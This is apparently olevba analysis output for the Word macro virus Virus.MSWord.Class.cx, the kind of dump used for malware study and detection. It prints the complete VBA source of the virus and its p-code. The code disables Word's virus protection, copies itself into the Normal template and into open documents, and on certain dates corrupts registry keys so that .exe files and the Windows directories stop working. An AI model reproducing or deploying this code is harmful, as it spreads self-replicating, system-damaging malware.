olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.cx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.cx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = False
DL90 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VK54 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set II64 = ActiveDocument.VBProject.VBComponents.Item(1)
LA40 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set II64 = NormalTemplate.VBProject.VBComponents.Item(1)
OA34 = True
End If
If OA34 <> True And LA40 <> True Then GoTo AC11
If OA34 = True Then II64.CodeModule.AddFromString ("Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub ToolsCustomize" & vbCr & "End Sub" & vbCr & "Sub FileTemplates" & vbCr & "End Sub" & vbCr & "Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VK54 - 1))
If LA40 = True Then II64.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(10, DL90 - 1))
If Month(Now) = Month(Now) And Day(Now) >= 20 Then
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Config\0001\Display\Settings", "Resolution") = "1024,768"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\Root\Modem\0000", "Class") = "Monitor"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Init", "1") = "XT<cr>"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Init", "2") = "XTE0V1<cr>"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Settings", "Prefix") = "XT"
End If
If Month(Now) = 12 And Day(Now) = 24 Then
MsgBox "Happy Birthday Dr. Swati Charry", vbSystemModal, "SCoRPIonS"
End If
If Month(Now) >= 11 And Day(Now) = 24 Then
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.exe", "(Default)") = "txtfile"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "WinBootDir") = "C:\Dos"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot") = "C:\Dos"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "WinDir") = "C:\Dos"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "WinAdminDir") = "C:\Dos"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "BootDir") = "D:\"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\Winbootdir", "devdir") = "C:\Dos"
End If
AC11:
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.cx
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4977 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #4:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St DL90 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St VK54 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set II64 
' Line #11:
' 	LitVarSpecial (True)
' 	St LA40 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set II64 
' Line #15:
' 	LitVarSpecial (True)
' 	St OA34 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld OA34 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld LA40 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo AC11 
' 	EndIf 
' Line #18:
' 	Ld OA34 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0012 "Sub ToolsCustomize"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld VK54 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld II64 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #19:
' 	Ld LA40 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x000A 
' 	Ld DL90 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld II64 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #20:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	LitStr 0x0008 "1024,768"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_LOCAL_MACHINE\Config\0001\Display\Settings"
' 	LitStr 0x000A "Resolution"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #23:
' 	LitStr 0x0007 "Monitor"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_LOCAL_MACHINE\Enum\Root\Modem\0000"
' 	LitStr 0x0005 "Class"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #24:
' 	LitStr 0x0006 "XT<cr>"
' 	LitStr 0x0000 ""
' 	LitStr 0x004A "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Init"
' 	LitStr 0x0001 "1"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #25:
' 	LitStr 0x000A "XTE0V1<cr>"
' 	LitStr 0x0000 ""
' 	LitStr 0x004A "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Init"
' 	LitStr 0x0001 "2"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #26:
' 	LitStr 0x0002 "XT"
' 	LitStr 0x0000 ""
' 	LitStr 0x004E "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Settings"
' 	LitStr 0x0006 "Prefix"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #29:
' 	LitStr 0x001F "Happy Birthday Dr. Swati Charry"
' 	Ld vbSystemModal 
' 	LitStr 0x0009 "SCoRPIonS"
' 	ArgsCall MsgBox 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Ge 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitStr 0x0007 "txtfile"
' 	LitStr 0x0000 ""
' 	LitStr 0x0016 "HKEY_CLASSES_ROOT\.exe"
' 	LitStr 0x0009 "(Default)"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #33:
' 	LitStr 0x0006 "C:\Dos"
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
' 	LitStr 0x000A "WinBootDir"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #34:
' 	LitStr 0x0006 "C:\Dos"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #35:
' 	LitStr 0x0006 "C:\Dos"
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
' 	LitStr 0x0006 "WinDir"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #36:
' 	LitStr 0x0006 "C:\Dos"
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
' 	LitStr 0x000B "WinAdminDir"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #37:
' 	LitStr 0x0003 "D:\"
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
' 	LitStr 0x0007 "BootDir"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #38:
' 	LitStr 0x0006 "C:\Dos"
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\Winbootdir"
' 	LitStr 0x0006 "devdir"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Label AC11 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' Line #44:
' Line #45:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

